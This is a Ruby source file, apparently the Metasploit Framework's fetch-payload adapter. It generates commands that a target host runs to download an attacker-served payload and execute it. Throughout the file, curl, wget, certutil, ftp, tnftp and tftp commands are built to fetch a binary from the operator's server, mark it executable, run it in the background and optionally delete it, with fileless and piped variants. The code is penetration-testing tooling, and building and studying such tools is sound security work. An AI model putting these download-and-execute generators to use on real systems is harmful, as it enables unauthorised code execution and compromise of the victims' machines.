module Msf
  ###
  #
  # Common library for fetch-based payloads
  #
  ###
  module Payload::Adapter::Fetch
    include Msf::Payload::Adapter::Fetch::Fileless
    include Msf::Payload::Adapter::Fetch::Multi
    include Msf::Payload::Adapter::Fetch::Pipe

    def initialize(*args)
      super
      register_options(
        [
          Msf::OptBool.new('FETCH_DELETE', [true, 'Attempt to delete the binary after execution', false]),
          Msf::OptPort.new('FETCH_SRVPORT', [true, 'Local port to use for serving payload', 8080]),
          # FETCH_SRVHOST defaults to LHOST, but if the payload doesn't connect back to Metasploit (e.g. adduser, messagebox, etc.) then FETCH_SRVHOST needs to be set
          Msf::OptAddressRoutable.new('FETCH_SRVHOST', [ !options['LHOST']&.required, 'Local IP to use for serving payload']),
          Msf::OptString.new('FETCH_URIPATH', [ false, 'Local URI to use for serving payload', '']),
        ]
      )
      register_advanced_options(
        [
          Msf::OptAddress.new('FetchListenerBindAddress', [ false, 'The specific IP address to bind to to serve the payload if different from FETCH_SRVHOST']),
          Msf::OptPort.new('FetchListenerBindPort', [false, 'The port to bind to if different from FETCH_SRVPORT']),
          Msf::OptBool.new('FetchHandlerDisable', [true, 'Disable fetch handler', false])
        ]
      )
      # XXX Maybe add a method to the parent single payload mixin to do this instead?
      # Need to remove the REQUESTED_ARCH datastore value and replace it with the bruteforce option.
      if datastore.include?('REQUESTED_ARCH')
        datastore['FETCH_PIPE'] = true
        register_options(
          [
            Msf::OptBool.new('FETCH_BRUTEFORCE', [true, 'Attempt all possible payloads if none match.', false])
          ]
        )
        deregister_options('REQUESTED_ARCH', 'FETCH_FILENAME')
      end
      @fetch_service = nil
      @multi_arch = nil             # used to make sure the payload UUID is generated with the right arch
      @myresources = []             # files currently being serveed
      @srv_resources = []           # stuff we want to serve
      @remote_destination_win = nil
      @remote_destination_nix = nil
      @windows = nil
    end

    # If no fetch URL is provided, we generate one based off the underlying payload data
    # This is because if we use a randomly-generated URI, the URI generated by venom and
    # Framework will not match.  This way, we can build a payload in venom and a listener
    # in Framework, and if the underlying payload type/host/port are the same, the URI
    # will be, too.
    #
    # This has been expanded to take a variable to tack onto the end before hashing, so we
    # can generate deterministic URIs on the fly.
    def default_srvuri(extra_data = nil)
      # If we're in framework, payload is in datastore; msfvenom has it in refname
      payload_name = datastore['payload'] ||= refname
      decoded_uri = payload_name.dup
      # there may be no transport, so leave the connection string off if that's the case
      netloc = ''
      if module_info['ConnectionType'].upcase == 'REVERSE' || module_info['ConnectionType'].upcase == 'TUNNEL'
        netloc << datastore['LHOST'] unless datastore['LHOST'].blank?
        unless datastore['LPORT'].blank?
          if Rex::Socket.is_ipv6?(netloc)
            netloc = "[#{netloc}]:#{datastore['LPORT']}"
          else
            netloc = "#{netloc}:#{datastore['LPORT']}"
          end
        end
      elsif module_info['ConnectionType'].upcase == 'BIND'
        netloc << datastore['LHOST'] unless datastore['LHOST'].blank?
        unless datastore['RPORT'].blank?
          if Rex::Socket.is_ipv6?(netloc)
            netloc = "[#{netloc}]:#{datastore['RPORT']}"
          else
            netloc = "#{netloc}:#{datastore['RPORT']}"
          end
        end
      end
      decoded_uri << ";#{netloc}"
      decoded_uri << ";#{extra_data}" unless extra_data.nil?
      Base64.urlsafe_encode64(OpenSSL::Digest::MD5.new(decoded_uri).digest, padding: false)
    end

    def download_uri(uri)
      "#{srvnetloc}/#{uri}"
    end

    def fetch_bindhost
      datastore['FetchListenerBindAddress'].blank? ? srvhost : datastore['FetchListenerBindAddress']
    end

    def fetch_bindport
      datastore['FetchListenerBindPort'].blank? ? srvport : datastore['FetchListenerBindPort']
    end

    def fetch_bindnetloc
      Rex::Socket.to_authority(fetch_bindhost, fetch_bindport)
    end

    def add_srv_entry(uri, data, arch = ARCH_CMD)
      srv_entry = {
        :arch => arch,
        :uri => uri,
        :data => data
      }
      @srv_resources << srv_entry
    end

    def generate(opts = {})
      opts[:arch] ||= module_info['AdaptedArch']
      if opts[:arch] == ARCH_ANY && module_info['AdaptedPlatform'] == 'linux'
        # create a hash with all the arches and payloads
        multi_arches.each do |arch|
          opts[:arch] = arch
          @multi_arch = arch # needed for payload_uuid creation
          vprint_status("Generating payload for #{arch}")
          opts[:code] = super(opts)
          # no FETCH_URIPATH support for multi payloads
          add_srv_entry(default_srvuri(arch.to_s), generate_payload_exe(opts), arch)
        end
        cmd = _generate_multi_commands(@srv_resources)
        # print_status("multi command:\n#{cmd}")
        if datastore['FETCH_PIPE']
          unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
            fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
          end
          add_srv_entry(pipe_srvuri, cmd)
          cmd = generate_pipe_command(pipe_srvuri)
          print_status("Pipe command: #{cmd}")
        end
      else
        opts[:code] = super
        add_srv_entry(srvuri, generate_payload_exe(opts), opts[:arch])
        cmd = generate_fetch_commands(srvuri)
        if datastore['FETCH_PIPE']
          unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
            fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
          end
          cmd << '\n' if windows? # Needs CR for Windows command
          add_srv_entry(pipe_srvuri, cmd)
          cmd = generate_pipe_command(pipe_srvuri)
        end
      end
      vprint_status("Command to execute on target: #{cmd}")
      cmd
    end

    def generate_fetch_commands(uri)
      # TODO: Make a check method that determines if we support a platform/server/command combination
      #
      case datastore['FETCH_COMMAND'].upcase
      when 'FTP'
        return _generate_ftp_command(uri)
      when 'TNFTP'
        return _generate_tnftp_command(uri)
      when 'WGET'
        return _generate_wget_command(uri)
      when 'CURL'
        return _generate_curl_command(uri)
      when 'TFTP'
        return _generate_tftp_command(uri)
      when 'CERTUTIL'
        return _generate_certutil_command(uri)
      else
        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
      end
    end

    def generate_stage(opts = {})
      opts[:arch] ||= module_info['AdaptedArch']
      conf[:arch] = @multi_arch unless @multi_arch.nil?
      super
    end

    def generate_payload_uuid(conf = {})
      conf[:arch] ||= module_info['AdaptedArch']
      conf[:arch] = @multi_arch unless @multi_arch.nil?
      conf[:platform] ||= module_info['AdaptedPlatform']
      super
    end

    def handle_connection(conn, opts = {})
      opts[:arch] ||= module_info['AdaptedArch']
      super
    end

    def srvhost
      host = datastore['FETCH_SRVHOST']
      host = datastore['LHOST'] if host.blank?
      host = '127.127.127.127' if host.blank?
      host
    end

    def srvnetloc
      Rex::Socket.to_authority(srvhost, srvport)
    end

    def srvport
      datastore['FETCH_SRVPORT']
    end

    def srvuri
      # If the user has selected FETCH_PIPE, we save any user-defined uri for the pipe command
      return default_srvuri if datastore['FETCH_PIPE'] || datastore['FETCH_URIPATH'].blank?

      datastore['FETCH_URIPATH']
    end

    def windows?
      return @windows unless @windows.nil?

      @windows = platform.platforms.first == Msf::Module::Platform::Windows
      @windows
    end

    def linux?
      return @linux unless @linux.nil?

      @linux = platform.platforms.first == Msf::Module::Platform::Linux
      @linux
    end

    def _check_tftp_port
      # Most tftp clients do not have configurable ports
      if datastore['FETCH_SRVPORT'] != 69 && datastore['FetchListenerBindPort'].blank?
        print_error('The TFTP client can only connect to port 69; to start the server on a different port use FetchListenerBindPort and redirect the connection.')
        fail_with(Msf::Module::Failure::BadConfig, 'FETCH_SRVPORT must be set to 69 when using the tftp client')
      end
    end

    def _check_tftp_file
      # Older Linux tftp clients do not support saving the file under a different name
      unless datastore['FETCH_WRITABLE_DIR'].blank? && datastore['FETCH_FILENAME'].blank?
        print_error('The Linux TFTP client does not support saving a file under a different name than the URI.')
        fail_with(Msf::Module::Failure::BadConfig, 'FETCH_WRITABLE_DIR and FETCH_FILENAME must be blank when using the tftp client')
      end
    end

    # copied from https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/socket_server.rb
    def _determine_server_comm(ip, srv_comm = datastore['ListenerComm'].to_s)
      comm = nil

      case srv_comm
      when 'local'
        comm = ::Rex::Socket::Comm::Local
      when /\A-?[0-9]+\Z/
        comm = framework.sessions.get(srv_comm.to_i)
        raise("Socket Server Comm (Session #{srv_comm}) does not exist") unless comm
        raise("Socket Server Comm (Session #{srv_comm}) does not implement Rex::Socket::Comm") unless comm.is_a? ::Rex::Socket::Comm
      when nil, ''
        unless ip.nil?
          comm = Rex::Socket::SwitchBoard.best_comm(ip)
        end
      else
        raise("SocketServer Comm '#{srv_comm}' is invalid")
      end

      comm || ::Rex::Socket::Comm::Local
    end

    def _execute_add(get_file_cmd)
      return _execute_win(get_file_cmd) if windows?

      return _execute_nix(get_file_cmd)
    end

    def _execute_win(get_file_cmd)
      cmds = " & start /B #{_remote_destination_win}"
      cmds << " & del #{_remote_destination_win}" if datastore['FETCH_DELETE']
      get_file_cmd << cmds
    end

    def _execute_nix(get_file_cmd)
      return _generate_fileless(get_file_cmd) if datastore['FETCH_FILELESS'] == 'bash'
      return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'

      cmds = get_file_cmd
      cmds << ";chmod +x #{_remote_destination_nix}"
      cmds << ";#{_remote_destination_nix}&"
      cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
      cmds
    end

    def _generate_certutil_command(uri)
      case fetch_protocol
      when 'HTTP'
        get_file_cmd = "certutil -urlcache -f http://#{download_uri(uri)} #{_remote_destination}"
      when 'HTTPS'
        # I don't think there is a way to disable cert check in certutil....
        print_error('CERTUTIL binary does not support insecure mode')
        fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using CERTUTIL')
        get_file_cmd = "certutil -urlcache -f https://#{download_uri(uri)} #{_remote_destination}"
      else
        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
      end
      _execute_add(get_file_cmd)
    end

    def _generate_curl_command(uri)
      case fetch_protocol
      when 'HTTP'
        get_file_cmd = "curl -so #{_remote_destination} http://#{download_uri(uri)}"
      when 'HTTPS'
        get_file_cmd = "curl -sko #{_remote_destination} https://#{download_uri(uri)}"
      when 'TFTP'
        get_file_cmd = "curl -so #{_remote_destination} tftp://#{download_uri(uri)}"
      else
        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
      end
      _execute_add(get_file_cmd)
    end

    def _generate_ftp_command(uri)
      case fetch_protocol
      when 'FTP'
        get_file_cmd = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri(uri)}"
      when 'HTTP'
        get_file_cmd = "ftp -Vo #{_remote_destination_nix} http://#{download_uri(uri)}"
      when 'HTTPS'
        get_file_cmd = "ftp -Vo #{_remote_destination_nix} https://#{download_uri(uri)}"
      else
        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
      end
      _execute_add(get_file_cmd)
    end

    def _generate_tftp_command(uri)
      _check_tftp_port
      case fetch_protocol
      when 'TFTP'
        if windows?
          fetch_command = _execute_win("tftp -i #{srvhost} GET #{uri} #{_remote_destination}")
        else
          _check_tftp_file
          if datastore['FETCH_FILELESS'] != 'none' && linux?
            return _generate_fileless("(echo binary ; echo get #{srvuri} $f ) | tftp #{srvhost}")
          else
            fetch_command = "(echo binary ; echo get #{srvuri} ) | tftp #{srvhost}; chmod +x ./#{srvuri}; ./#{srvuri} &"
          end
        end
      else
        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
      end
      fetch_command
    end

    def _generate_tnftp_command(uri)
      case fetch_protocol
      when 'FTP'
        get_file_cmd = "tnftp -Vo #{_remote_destination_nix} ftp://#{download_uri(uri)}"
      when 'HTTP'
        get_file_cmd = "tnftp -Vo #{_remote_destination_nix} http://#{download_uri(uri)}"
      when 'HTTPS'
        get_file_cmd = "tnftp -Vo #{_remote_destination_nix} https://#{download_uri(uri)}"
      else
        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
      end
      _execute_add(get_file_cmd)
    end

    def _generate_wget_command(uri)
      case fetch_protocol
      when 'HTTPS'
        get_file_cmd = "wget -qO #{_remote_destination} --no-check-certificate https://#{download_uri(uri)}"
      when 'HTTP'
        get_file_cmd = "wget -qO #{_remote_destination} http://#{download_uri(uri)}"
      else
        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
      end

      _execute_add(get_file_cmd)
    end

    def _remote_destination
      return _remote_destination_win if windows?

      return _remote_destination_nix
    end

    def _remote_destination_nix

      if datastore['FETCH_FILELESS'] != 'none'
        @remote_destination_nix = '$f'
      else
        writable_dir = datastore['FETCH_WRITABLE_DIR']
        writable_dir = '.' if writable_dir.blank?
        writable_dir += '/' unless writable_dir[-1] == '/'
        payload_filename = datastore['FETCH_FILENAME']
        payload_filename = srvuri if payload_filename.blank?
        payload_path = writable_dir + payload_filename
        @remote_destination_nix = payload_path
      end
      @remote_destination_nix
    end

    def _remote_destination_win
      writable_dir = datastore['FETCH_WRITABLE_DIR']
      writable_dir += '\\' unless writable_dir.blank? || writable_dir[-1] == '\\'
      payload_filename = datastore['FETCH_FILENAME']
      payload_filename = srvuri if payload_filename.blank?
      payload_path = writable_dir + payload_filename
      payload_path += '.exe' unless payload_path[-4..] == '.exe'
      @remote_destination_win = payload_path
      @remote_destination_win
    end
  end
end
